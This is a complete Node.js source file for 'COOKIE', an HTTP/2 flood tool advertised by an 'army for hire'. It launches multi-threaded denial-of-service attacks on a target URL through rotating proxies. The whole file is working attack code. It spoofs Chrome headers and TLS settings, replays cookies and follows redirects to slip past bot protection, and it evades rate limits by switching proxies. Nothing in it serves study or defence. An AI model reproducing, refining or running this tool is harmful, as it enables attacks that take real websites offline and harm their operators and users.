/*
    COOKIE (v1.0) flood

    Thank you for 500 members!

    Features:
    - Redirect
    - Cookies
    - Ratelimit
    - Queries

    Released by ATLAS API corporation (atlasapi.co)

    Made by Benshii Varga
*/

process.on('uncaughtException', function(er) {
    // console.log(er);
});
process.on('unhandledRejection', function(er) {
    // console.log(er);
});

process.on("SIGHUP", () => {
    return 1;
})
process.on("SIGCHILD", () => {
    return 1;
});

require('events').EventEmitter.defaultMaxListeners = 0;
process.setMaxListeners(0);

const crypto = require("crypto");
const fs = require('fs');
const url = require('url');
const cluster = require('cluster');
const http2 = require('http2');
const http = require('http');
const tls = require('tls');
const colors = require('colors');

const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
defaultCiphers[2],
defaultCiphers[1],
defaultCiphers[0],
defaultCiphers.slice(3) 
].join(":");

let ratelimit = [];

if (process.argv.length < 7) {
    console.clear();
    console.log(`
                ${'ATLAS API corporation'.red} | ${'an army for hire'.white}

                            ${' 21 March, 2024 '.bgWhite.black.italic}

    ${'telegram'.bold}:                ${'t.me/benshii'.bold.cyan}
    ${'product'.bold}:                 ${'cookie (v1.0)'.bold.magenta}

    ${'usage'.bold}:
        node cookie.js [url] [time] [rate] [threads] [proxy]

    ${'options'.bold}:
        --debug         ${'true'.green}/${'false'.red}   ~   ${'Enable advanced debugging.'.italic}
        --redirect      ${'true'.green}/${'false'.red}   ~   ${'Enable redirect system.'.italic}
        --ratelimit     ${'true'.green}/${'false'.red}   ~   ${'Enable ratelimit system.'.italic}
        --query         ${'true'.green}/${'false'.red}   ~   ${'Enable random queries.'.italic}
    `);
    process.exit(0);
}

const target = process.argv[2]// || 'https://localhost:443';
const duration = parseInt(process.argv[3]) || 60;
const threads = parseInt(process.argv[4]) || 10;
const rate = parseInt(process.argv[5]) || 64;
const proxyfile = process.argv[6] || 'proxies.txt';

var parsed = url.parse(target);

var proxies = fs.readFileSync(proxyfile, 'utf-8').toString().replace(/\r/g, '').split('\n');

function get_option(flag) {
    const index = process.argv.indexOf(flag);
    return index !== -1 && index + 1 < process.argv.length ? process.argv[index + 1] : undefined;
}
  
const options = [
    { flag: '--debug', value: get_option('--debug') },
    { flag: '--redirect', value: get_option('--redirect') },
    { flag: '--ratelimit', value: get_option('--ratelimit') },
    { flag: '--query', value: get_option('--query') },
];

function enabled(buf) {
    var flag = `--${buf}`;
    const option = options.find(option => option.flag === flag);

    if (option === undefined) { return false; }

    const optionValue = option.value;

    if (optionValue === "true" || optionValue === true) {
        return true;
    } else if (optionValue === "false" || optionValue === false) {
        return false;
    }
    
    if (!isNaN(optionValue)) {
        return parseInt(optionValue);
    }

    if (typeof optionValue === 'string') {
        return optionValue;
    }

    return false;
}

const lang_header = [
    'en-US,en;q=0.9',
	'en-GB,en;q=0.9',
    "en-US,en;q=0.5"
]

const encoding_header = [
    'gzip, deflaten br, zstd',
    'gzip, deflate, br',
    'gzip, deflate'
]

function random_ua() {
    const versions = [
        "120:8.0.0.0",
        "121:99.0.0.0",
        "122:24.0.0.0",
        "123:8.0.0.0"
    ];

    const platforms = [
        "Windows:Windows NT 10.0; Win64; x64",
        "Linux:X11; Linux x86_64",
        "macOS:Macintosh; Intel Mac OS X 10_15_7"
    ];

    const user_agents = 'Mozilla/5.0 ({}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{}.0.0.0 Safari/537.36';

    const version = versions[Math.floor(Math.random() * versions.length)].split(":");
    const platform = platforms[Math.floor(Math.random() * platforms.length)].split(":");

    console.log(version);
    let header = {
        ua: user_agents.replace(/\{\}/g, platform[1]).replace(/\{\}/g, version[0]),
        ch_ua: `\"Not_A Brand\";v=\"${version[0]}\", \"Chromium\";v=\"${version[1]}\", \"Google Chrome\";v=\"${version[1]}\"`,
        version: version,
        platform: platform[0]
    };
    return header
}

function random_ua_v2() {
        const platforms = [
            "Windows:Windows NT 10.0; Win64; x64",
            "Linux:X11; Linux x86_64",
            "macOS:Macintosh; Intel Mac OS X 10_15_7"
        ];
        const brands = [
            {
                brand: "Google Chrome",
                versions: [
                    "128:128.0.0.0",
                    "127:127.0.0.0",
                    "99:99.0.4844.51",
                    "98:98.0.4758.109",
                    "97:97.0.4692.71",
                    "96:96.0.4664.45"
                ]
            },
            //{ brand: "Chromium", versions: ["95:95.0.4638.69", "94:94.0.4606.81", "93:93.0.4577.63", "92:92.0.4515.131"] },
            // { brand: "Brave", versions: ["120.0.0.0", ] }
        ];
        const brandIndex = Math.floor(Math.random() * brands.length);
        const selectedBrand = brands[brandIndex];
        const selectedVersion = selectedBrand.versions[Math.floor(Math.random() * selectedBrand.versions.length)].split(':');
        const platformIndex = Math.floor(Math.random() * platforms.length);
        const selectedPlatform = platforms[platformIndex].split(":");
        const user_agents = `Mozilla/5.0 (${selectedPlatform[1]}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${selectedVersion[0]}.0.0.0 Safari/537.36`;
        const ch_ua = `\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"${selectedVersion[1]}\", \"${selectedBrand.brand}\";v=\"${selectedVersion[1]}\"`;
        const ch_brands = ch_ua.split(', ');

        for (let i = ch_brands.length - 1; i > 0; i--) {
            const j = Math.floor(Math.random() * (i + 1));
            [ch_brands[i], ch_brands[j]] = [ch_brands[j], ch_brands[i]];
        }

        const shuffled_ch_ua = ch_brands.join(', ');

        let header = {
            ua: user_agents,
            ch_ua: shuffled_ch_ua,//`\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"${selectedVersion[1]}\", \"${selectedBrand.brand}\";v=\"${selectedVersion[1]}\"`,
            version: selectedVersion,
            platform: selectedPlatform[0]
        };
        return header;
}

function random_string(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    let result = '';
    for (let i = 0; i < length; i++) {
        const randomIndex = Math.floor(Math.random() * characters.length);
        result += characters[randomIndex];
    }
    return result;
}

function ja3(socket) {
    const cipherInfo = socket.getCipher();
	const supportedVersions = socket.getProtocol();
	  
		if (!cipherInfo) {
		  return null;
        }
		const ja3String = `${cipherInfo.name}-${cipherInfo.version}:${supportedVersions}:${cipherInfo.bits}`;
	  
		const md5Hash = crypto.createHash('md5');
		md5Hash.update(ja3String);
	  
		return md5Hash.digest('hex');
}

function _tlsSocket(parsed, socket) {
    const tls_socket = tls.connect({
        host: parsed.host,
        ciphers: ciphers,
        servername: parsed.host,
        secure: true,
        requestCert: true,
        rejectUnauthorized: false,
        maxRedirects: 20,
        followAllRedirects: true,
        minVersion: 'TLSv1.2',
        maxVersion: 'TLSv1.3',
        ALPNProtocols: ['h2', 'http/1.1'],
        sessionTimeout: 5000,
        honorCipherOrder: true,
        socket: socket,
    });
    tls_socket.setKeepAlive(true, 600000 * 1000);
      
    return tls_socket;
}

async function attack(){
        const currentTime = Date.now();
        ratelimit = ratelimit.filter(limit => currentTime - limit.timestamp <= 60000);
        (() => {
            const currentTime = Date.now();
            ratelimit = ratelimit.filter(limit => currentTime - limit.timestamp <= 60000);
        })();
        let proxy;
        do {
            proxy = proxies[Math.floor(Math.random() * proxies.length)];
            proxy = proxy.split(':');
        } while (ratelimit.some(limit => limit.proxy === proxy[0] && (Date.now() - limit.timestamp) < 60000));

        const agent = new http.Agent({
            keepAlive: true,
            maxFreeSockets: Infinity,
            keepAliveMsecs: Infinity,
            maxSockets: Infinity,
            maxTotalSockets: Infinity
        });
        http.request({
            host: proxy[0],
            agent: agent,
            globalAgent: agent,
            port: proxy[1],
            headers: {
                'Host': parsed.host,
                'Proxy-Connection': 'Keep-Alive',
                'Connection': 'Keep-Alive',
            },
            method: 'CONNECT',
            path: parsed.host,
        }).on("connect", async (res, socket) => {
            if (res.statusCode === 200) {
                const header = random_ua_v2();
                //console.log("header:", header);
                let headers = {
                    ":method": "GET",
                    ":path": enabled('query') ? (parsed.pathname + '?=' + random_string(6, 7)) : parsed.pathname,
                    ":authority": parsed.host,
                    ":scheme": "https",
                    "User-Agent": header.ua,
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                    "Accept-Encoding": encoding_header[Math.floor(Math.random() * encoding_header.length)],
                    "Accept-Language": lang_header[Math.floor(Math.random() * lang_header.length)],
                    "Sec-Ch-Ua": header.ch_ua,
                    "Sec-Ch-Ua-Mobile": "?0",
                    "Sec-Ch-Ua-Platform": `\"${header.platform}\"`,
                    "Sec-Fetch-Site": "none",
                    ...(Math.random() < 0.5 && { "sec-fetch-mode": "navigate" }),
                    ...(Math.random() < 0.5 && { "sec-fetch-user": "?1" }),
                    ...(Math.random() < 0.5 && { "sec-fetch-dest": "document" }),
                    "Upgrade-Insecure-Requests": "1",
                };
                socket.setKeepAlive(true, 100000);
                const tls_socket = _tlsSocket(parsed, socket);

                await tls_socket.on('secureConnect', async () => {
                    const ja3fingerprint = await ja3(tls_socket);
                    //console.log("fingerprint:", ja3fingerprint)
                    headers["ja3"] = ja3fingerprint;
                });
                await tls_socket.on('error', (_error) => {
                    return;
                });
                const client = http2.connect(parsed.href, {
                    createConnection: () => tls_socket,
                    initialWindowSize: 15663105,
                    settings: {
                        headerTableSize: 65536,
                        maxConcurrentStreams: 1000,
                        initialWindowSize: 6291456,
                        maxHeaderListSize: 262144,
                        enablePush: false,
                    },
                }, async () => {
                    function request() {
                            if (client.destroyed) {
                                return
                            }
                            
                            const req = client.request(headers);

                            req.on("response", (res) => {
                                const status = res[':status'];
                                let coloredStatus;
                                    if (status < 500 && status >= 400 && status !== 404) {
                                        coloredStatus = status.toString().red;
                                    } else if (status >= 300 && status < 400) {
                                        coloredStatus = status.toString().yellow;
                                    } else if (status == 404) {
                                        coloredStatus = status.toString().cyan;
                                    } else {
                                        coloredStatus = status.toString().green;
                                    }

                                if (enabled('debug')) {
                                    if (headers["cookie"] !== undefined) {
                                        console.log(`[${'js/cookie'.bold.magenta}] | ${colors.cyan(`${proxy[0]}:${proxy[1]}`.underline)}, ${headers[':authority']}${headers[':path']}, ${`${headers['cookie']}`.green.underline}, ${'Status'.bold}: ${coloredStatus}`);
                                    } else {
                                        console.log(`[${'js/cookie'.bold.magenta}] | ${colors.cyan(`${proxy[0]}:${proxy[1]}`.underline)}, ${headers[':authority']}${headers[':path']}, ${'Status'.bold}: ${coloredStatus}`);
                                    }
                                }

                                if (status === 429 && enabled('ratelimit')) {
                                    ratelimit.push({proxy: proxy, timestamp: Date.now()});
                                    //console.log(ratelimit.length);
                                    client.destroy();
                                    return;
                                } else if (status > 300 && status < 400 && res["set-cookie"]) {
                                    const _cookie = res["set-cookie"];
                                    const redirect = res["location"];
                                    const redirectedUrl = new URL(redirect, parsed.href);
                                                        const redirectedParsed = {
                                                            host: redirectedUrl.host,
                                                            path: redirectedUrl.pathname,
                                                            href: redirectedUrl.href
                                                        };
                                    if (enabled('redirect')) {
                                        if (parsed.href !== redirectedParsed.href) {
                                            if (enabled('debug')) {
                                                console.log(`[${'js/cookie'.bold.magenta}] | ${colors.cyan.underline(proxy)} ${'Redirect'.bold}: ${parsed.href} -> ${redirectedParsed.href}`)
                                            }
                                            headers[":path"] = redirectedParsed.path
                                            headers[":authority"] = redirectedParsed.host;
                                            headers["referer"] = redirectedParsed.href;
                                        } else {
                                            // console.log(`parsed.path = ${parsed.path}, parsed2.path = ${parsed2.path}`);
                                            headers["Sec-Fetch-Site"] = "same-origin"
                                        }
                                    }
                                    headers["cookie"] = _cookie.join('; ');
                                } else if (status > 300 && status < 400 && !res["set-cookie"]) {
                                    const redirect = res["location"];
                                    const redirectedUrl = new URL(redirect, parsed.href);
                                                        const redirectedParsed = {
                                                            host: redirectedUrl.host,
                                                            path: redirectedUrl.pathname,
                                                            href: redirectedUrl.href
                                                        };
                                    if (enabled('redirect')) {
                                        if (parsed.href !== redirectedParsed.href) {
                                            if (enabled('debug')) {
                                                console.log(`[${'js/cookie'.bold.magenta}] | ${colors.cyan.underline(proxy)} ${'Redirect'.bold}: ${parsed.href} -> ${redirectedParsed.href}`)
                                            }
                                            headers[":path"] = redirectedParsed.path
                                            headers[":authority"] = redirectedParsed.host;
                                            headers["referer"] = redirectedParsed.href;
                                        } else {
                                            headers["Sec-Fetch-Site"] = "same-origin"
                                        }
                                    }
                                } else if (res["set-cookie"]) {

                                    const _cookie = res["set-cookie"];
 
                                    headers["cookie"] = _cookie.join('; ');
                                }
                                req.close()
                                // req.destroy() connection close - httpddos
                            }).end();
                            setTimeout(() => {
                                request()
                            }, 1000 / rate)
                        }
                        request();
                    }).on('error', (err) => {
                        if (err.code === "ERR_HTTP2_GOAWAY_SESSION") {
                            client.destroy();
                        } else if (err.code === "ECONNRESET") {
                            client.destroy();
                        }
                    })
                }
            }).on("error", () => {
                return
            }).end()
}


if (cluster.isMaster){
    console.clear();
    console.log('   ATLAS API corporation\n'.cyan);
    console.log(`-`.red, 'Method:'.bold, '['.red, `COOKIE`.underline, ']'.red);
    console.log(`-`.red, 'Target:'.bold, '['.red, `${target}`.underline, ']'.red);
    console.log("-".red, "Duration:".bold, "[".red, `${duration}`.underline, "]".red);
    console.log("-".red, "Threads:".bold, "[".red, `${threads}`.underline, "]".red);
    console.log("-".red, "Rate:".bold, "[".red, `${rate}`.underline, "]".red);
    console.log("-".red, "Proxy:".bold, "[".red, `${proxyfile}`.underline, "]".red);
    for (let i = 0; i < threads; i++){
        cluster.fork();
    }
    setTimeout(() => {
        console.log("attack ended");
        process.exit(1);
    }, duration * 1000);
} else {
    const interval = setInterval(attack);
    setTimeout(() => {
        clearInterval(interval)
        process.exit(1);
    }, duration * 1000);
}
 
